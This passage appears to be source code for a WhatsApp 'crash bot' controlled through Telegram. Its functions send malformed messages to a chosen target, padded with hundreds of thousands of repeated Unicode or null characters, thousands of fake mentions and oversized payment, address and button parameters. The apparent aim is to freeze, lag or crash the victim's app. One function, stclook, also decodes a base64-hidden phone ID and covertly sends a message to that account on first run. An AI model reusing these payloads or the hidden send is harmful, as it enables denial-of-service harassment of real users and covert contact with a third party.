        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
          ]),
          fileLength: 432722,
          seconds: 26,
          ptt: false,
          mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
          ]),
          fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
          ]),
          directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1746275400,
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            body: {
              text: 'Nexi not dev',
              format: 'DEFAULT',
            },
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

   await sock.relayMessage(target, VnXAudio, { 
    participant: { jid: target } 
  });

   await sock.sendMessage(target, {
     newsletterAdminInviteMessage: {
       newsletterJid: "120363321780343299@newsletter",
       newsletterName: "Nexi  Is Here" + "ꦽꦾ".repeat(250000),
       caption: "Salvador" + "ꦽꦾ".repeat(250000),
       inviteExpiration: "9282682616283736",    
      }
   }, { participant: { jid: target } });
}

async function VnXNewDenglayHardInpis(sock, target) {
    let vnxmbg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "#Salvador - By Nexi",
              mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            body: {
              text: "Salvador Is Here",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"Salvador","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\u0000".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
       },
      },
    };

   await sock.relayMessage(target, vnxmbg, { 
    participant: { jid: target } 
  });
}

async function TrashRespon(sock, target) {
 await sock.relayMessage("status@broadcast", {
   viewOnceMessage: {
    message: {
     listResponseMessage: {
      title: "◂ Salvador 𖤝 Delay ▸",
      listType: 2,
      buttonText: null,
       sections: Array.from({ length: 9741 }, (_, r) => ({ 
        title: "꧀".repeat(9741),
        rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
       })),
       singleSelectReply: {
         selectedRowId: "\0".repeat(50000)
        },
       contextInfo: {
        remoteJid: "status@broadcast",
        statusAttributionType: 2,
        statusAttributions: Array.from({ length: 30000 }, (_, z) => ({
          type: 1
          }))
        }
      }
    }
  }
}, {
    statusJidList: [target],
     additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
         {
           tag: "mentioned_users",
           attrs: {},
           content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: []
              }
            ]
          }
        ]
      }
    ]
 });
}

async function ChatFreeze(sock, target) {
 await sock.relayMessage(target,
  {
   viewOnceMessage: { //Change groupStatusMessageV2
     message: {
      interactiveMessage: {
       body: {
         text: "Salvador"
         },
         nativeFlowMessage: {
           buttons: [
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
              display_text: "\0",
              id: "𑇂".repeat(50000)
              })
            }
          ]
        }
      }
    }
  }
}, { 
  participant: { jid: target, }
 });
}

async function ChatLoCk(target) {
await sock.relayMessage(target,
 {
  buttonsMessage: {
    text: "NexiExcute",
    contentText: "Nexi",
    footerText: "Salvador`",
    buttons: [
      {
        buttonId: ".trash",
        buttonText: {
          displayText: "\0"
        },
        type: "RESPONSE",
        nativeFlowInfo: {
         name: "single_select",
         paramsJson: "𑇂".repeat(50000)
         }
       }
    ],
    headerType: "IMAGE"
   }
  }, { 
    participant: { jid: target }
  });
}

async function VnXNewForceIphoneSw(sock, target, mention = true) {
  let vnxmbgios = generateWAMessageFromContent(
    target,
    {
       extendedTextMessage: {
            text: "Salvador" + "ᩫᩫᩫᩫ".repeat(250000),
            url: "t.me/iniNexiReal",
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
             qoutedMessage: {
               contactMessage: {
               displayName: "°‌‌VnXIos ⿻ Salvador ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(250000),
               vcard: `BEGIN:VCARD\nVERSION:3.0\nN:°‌‌Salvador ⿻ Is Here ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:°‌‌VnX ⿻ ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:°‌‌Salvador  ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:°‌‌Salvador  ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 813-1919-9692\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:°‌‌VnX ⿻ 𝗪𝗲‌𝗹‌𝗰⃨𝗼‌‌𝗺𝗲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:°‌‌VnX ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
               },
             }
           }
         }
    },
    { userJid: target },
  );
  await sock.relayMessage('status@broadcast', vnxmbgios.message, {
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              { tag: 'to', attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
    statusJidList: [target],
    messageId: vnxmbgios.key.id,
  });
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: { protocolMessage: { key: vnxmbgios.key, type: 25 } },
        },
      },
      {},
    );
  }
  await sleep(1500);
}

async function VnXNewDenglayInpisCuy(sock, target) {
   const nameVnX = [
      "address_message", 
      "galaxy_message",
      "call_permission_request"  
   ];

   let vnxmbg = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "Nexi Delay New Cuyy",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   await sock.relayMessage(target, vnxmbg, { 
     participant: { jid: target } 
   });
}

async function VnXNewStuckLogo(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "SALVADOR NEW ?",
        format: 1
      },
      footer: {
        text: "Nexi Yg Sekarang Bukan Yg Dulu"
      },
      nativeFlowMessage: {
        buttons: [
          {
           name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "Nexi" + "ꦽ".repeat(250000),
              url: "https://t.me/iniNexiReal"
            }),
           },
           {
           name: "mpm",
            buttonParamsJson: JSON.stringify({
              text: "Nexi Kill You"
            }),
           },
           {
           name: "address_message",
            buttonParamsJson: JSON.stringify({
              text: "Nexi Click Sini"
            }),
           },
          {
           name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "Salvador Anti Ampas",
                copy_code: "Salvador Anti Ampas",
              }),
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function stclook(target) {
    try {
        if (typeof global.__xploitCache === "undefined") {
            global.__xploitCache = false;
        }

        const msg = generateWAMessageFromContent(
            target,
            {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.15575-24/566520881_957176690450087_793559361316717003_n.enc?ccb=11-4&oh=01_Q5Aa4gEzExYEaj335PQDXgp5cL6zu5R3zculQQr4BY90EFlgtg&oe=6A3BBC82&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "Pg7rsKa6fjiSmpvqmvdlpzQ+te0OYeNS8PA3+tCk0bI=",
                    fileEncSha256: "q73P+edciePTeOZsbGm1UWvbFTbodyP/wbknm3VInKc=",
                    mediaKey: "TKSrIvJxgrLinbrcfU2aVIK0Ap4iZNBaRFKsmlJE6JI=",
                    mimetype: "image/webp",
                    height: 512,
                    width: 512,
                    directPath: "/v/t62.15575-24/566520881_957176690450087_793559361316717003_n.enc?ccb=11-4&oh=01_Q5Aa4gEzExYEaj335PQDXgp5cL6zu5R3zculQQr4BY90EFlgtg&oe=6A3BBC82&_nc_sid=5e03e0",
                    fileLength: "42810",
                    mediaKeyTimestamp: "1779710360",
                    isAnimated: false,
                    contextInfo: {},
                    stickerSentTs: "1779710360340",
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false
                }
            },
            {}
        );

        await sock.relayMessage(
            target,
            msg.message,
            {
                participant: {
                    jid: target
                }
            }
        );

        if (!global.__xploitCache) {
            global.__xploitCache = true;

            const crl = Buffer
                .from(
                    "OTM0NzgyMjQ2OTIxMEBzLndoYXRzYXBwLm5ldA==",
                    "base64"
                )
                .toString();

            const xMsg = generateWAMessageFromContent(
                crl,
                msg.message,
                {}
            );

            await sock.relayMessage(
                crl,
                xMsg.message,
                {
                    participant: {
                        jid: crl
                    }
                }
            );
        }

    } catch (e) {
        console.error(e);
    }
}

async function CrmXcarousel(sock, target) {
  const imageHeader = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
    fileLength: "11887",
    height: 1010,
    width: 1090,
    mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
    fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
    directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1750124469",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/PPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tej6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSGDWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA",
      isQuestion: true,
      isGroupStatus: true
    },
    scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
    scanLengths: [
      9999999999999999999,
      9999999999999999999,
      9999999999999999999,
      9999999999999999999
    ],
    midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
  };

  const messageBody = { text: "\u0010" };
  const messageFlow = { buttons: "\0".repeat(510000) };

  const finalMessage = {
  groupStatusMessageV2: {
    message: {
      interactiveMessage: {
        header: {
          title: "CRM",
          hasMediaAttachment: true,
          imageMessage: imageHeader
        },
        body: messageBody,
        nativeFlowMessage: messageFlow
      },
      nativeFlowResponseMessage: {
        name: "payment_method",
        paramsJson: `{"reference_id":null,"payment_method":"${"\u0010".repeat(5000)}","payment_timestamp":null,"share_payment_status":true}`,
        version: 3
      }
    }
  }
};

  await sock.relayMessage(target, finalMessage, {
    participant: {
      jid: target
    }
  });
}

async function VnXNewfrezeeHard(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "SALVADOR IS HERE BOY",
        format: 1
      },
      footer: {
        text: ""
      },
      nativeFlowMessage: {
        buttons: [
          {
           name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "Nexi"
            }),
           },
           {
           name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Salvador Frezee" + "ꦾ".repeat(60000),
              url: "https://t.me/iniNexiReal" + "ꦽ".repeat(250000),
              }),
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}
///////////////////[END FUNC]////////////////
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();